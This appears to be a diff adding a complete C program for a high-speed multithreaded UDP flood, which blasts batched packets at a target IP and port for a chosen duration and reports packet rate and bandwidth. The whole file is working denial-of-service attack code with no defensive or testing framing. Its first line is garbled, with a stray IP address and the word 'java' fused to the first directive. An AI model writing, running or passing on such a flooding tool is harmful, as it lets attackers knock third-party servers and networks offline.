@@ -1,0 +1,151 @@
+199.195.140.151java#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <sched.h>
+#include <errno.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <time.h>
+#include <stdatomic.h>
+#include <linux/socket.h>
+
+#define MAX_PACKET_SIZE 1400
+#define MAX_BATCH 64
+#define PAYLOAD_CHAR 0x41
+
+typedef struct {
+    char *ip;
+    int port;
+    int packet_size;
+    int duration;
+    int thread_id;
+} FloodConfig;
+
+atomic_ulong global_pps = 0;
+atomic_ulong global_bps = 0;
+volatile int keep_running = 1;
+
+void pin_to_core(int core_id) {
+    cpu_set_t cpuset;
+    CPU_ZERO(&cpuset);
+    CPU_SET(core_id, &cpuset);
+    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
+}
+
+void* flood_thread(void *arg) {
+    FloodConfig *cfg = (FloodConfig *)arg;
+    pin_to_core(cfg->thread_id);
+
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) {
+        perror("socket");
+        return NULL;
+    }
+
+    int sndbuf = 16 * 1024 * 1024;
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+
+    struct sockaddr_in target;
+    memset(&target, 0, sizeof(target));
+    target.sin_family = AF_INET;
+    target.sin_port = htons(cfg->port);
+    inet_pton(AF_INET, cfg->ip, &target.sin_addr);
+
+    char payload[MAX_PACKET_SIZE];
+    memset(payload, PAYLOAD_CHAR, cfg->packet_size);
+
+    struct mmsghdr msgs[MAX_BATCH];
+    struct iovec iovecs[MAX_BATCH];
+    struct sockaddr_in addrs[MAX_BATCH];
+    socklen_t addrlen = sizeof(struct sockaddr_in);
+
+    for (int i = 0; i < MAX_BATCH; i++) {
+        addrs[i] = target;
+        iovecs[i].iov_base = payload;
+        iovecs[i].iov_len = cfg->packet_size;
+
+        msgs[i].msg_hdr.msg_name = &addrs[i];
+        msgs[i].msg_hdr.msg_namelen = addrlen;
+        msgs[i].msg_hdr.msg_iov = &iovecs[i];
+        msgs[i].msg_hdr.msg_iovlen = 1;
+        msgs[i].msg_hdr.msg_control = NULL;
+        msgs[i].msg_hdr.msg_controllen = 0;
+        msgs[i].msg_hdr.msg_flags = 0;
+    }
+
+    while (keep_running) {
+        int sent = sendmmsg(sock, msgs, MAX_BATCH, 0);
+        if (sent > 0) {
+            atomic_fetch_add(&global_pps, sent);
+            atomic_fetch_add(&global_bps, sent * cfg->packet_size);
+        } else if (errno != EAGAIN && errno != ENOBUFS) {
+            perror("sendmmsg");
+        }
+    }
+
+    close(sock);
+    return NULL;
+}
+
+void* stats_thread(void *arg) {
+    (void)arg;
+    while (keep_running) {
+        sleep(1);
+        unsigned long pps = atomic_exchange(&global_pps, 0);
+        unsigned long bps = atomic_exchange(&global_bps, 0);
+        printf("[STATS] PPS: %lu | Bandwidth: %.2f Mbps\n", pps, (bps * 8.0) / 1e6);
+        fflush(stdout);
+    }
+    return NULL;
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 6) {
+        fprintf(stderr, "Usage: %s <target_ip> <port> <packet_size> <threads> <duration_sec>\n", argv[0]);
+        return 1;
+    }
+
+    FloodConfig cfg;
+    cfg.ip = argv[1];
+    cfg.port = atoi(argv[2]);
+    cfg.packet_size = atoi(argv[3]);
+    int threads = atoi(argv[4]);
+    cfg.duration = atoi(argv[5]);
+
+    if (cfg.packet_size <= 0 || cfg.packet_size > MAX_PACKET_SIZE) {
+        fprintf(stderr, "Invalid packet size.\n");
+        return 1;
+    }
+
+    pthread_t *tids = malloc(sizeof(pthread_t) * threads);
+    FloodConfig *configs = malloc(sizeof(FloodConfig) * threads);
+
+    printf("Starting high-speed UDP flood to %s:%d\n", cfg.ip, cfg.port);
+
+    pthread_t stat_thread_id;
+    pthread_create(&stat_thread_id, NULL, stats_thread, NULL);
+
+    for (int i = 0; i < threads; i++) {
+        configs[i] = cfg;
+        configs[i].thread_id = i;
+        pthread_create(&tids[i], NULL, flood_thread, &configs[i]);
+    }
+
+    sleep(cfg.duration);
+    keep_running = 0;
+
+    for (int i = 0; i < threads; i++) {
+        pthread_join(tids[i], NULL);
+    }
+    pthread_join(stat_thread_id, NULL);
+
+    printf("Flood complete.\n");
+    free(tids);
+    free(configs);
+    return 0;
+}
